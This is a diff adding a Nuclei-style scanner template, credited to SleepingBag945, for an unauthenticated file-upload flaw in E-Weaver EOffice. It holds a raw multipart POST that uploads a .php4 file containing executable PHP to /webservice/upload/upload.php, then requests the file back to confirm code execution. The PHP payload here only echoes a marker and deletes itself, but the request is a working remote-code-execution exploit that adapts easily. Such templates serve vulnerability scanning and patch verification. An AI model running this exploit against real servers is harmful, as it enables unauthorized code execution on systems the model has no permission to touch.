@@ -1,0 +1,46 @@
+id: weaver-eoffice-webservice-upload-fileupload
+
+info:
+  name: E-Weaver EOffice webservice upload file upload
+  author: SleepingBag945
+  severity: critical
+  reference:
+    - https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0125638
+    - https://fofa.info/result?qbase64=YXBwPSLms5vlvq4tRU9mZmljZSI%3D
+    - https://www.t00ls.com/thread-68187-1-1.html
+  tags: weaver,eoffice,upload
+
+http:
+  - raw:
+      - |
+        POST /webservice/upload/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr_1}}
+
+        ------WebKitFormBoundary{{randstr_1}}
+        Content-Disposition: form-data; name="file"; filename="{{randstr_2}}.php4"
+        Content-Type: application/octet-stream
+
+        <?php echo "{{randstr_3}}";unlink(__FILE__);?>
+
+        ------WebKitFormBoundary{{randstr_1}}--
+
+        
+      - |
+        GET /attachment/{{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: dsl  # type of the extractor
+        name: path
+        internal: true
+        dsl:
+          - replace(body_1, "*", "/") # dsl expression value to extract from response
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && contains(body_1,".php")
+          - status_code_2 == 200 && contains(body_2,"{{randstr_3}}")
+        condition: and
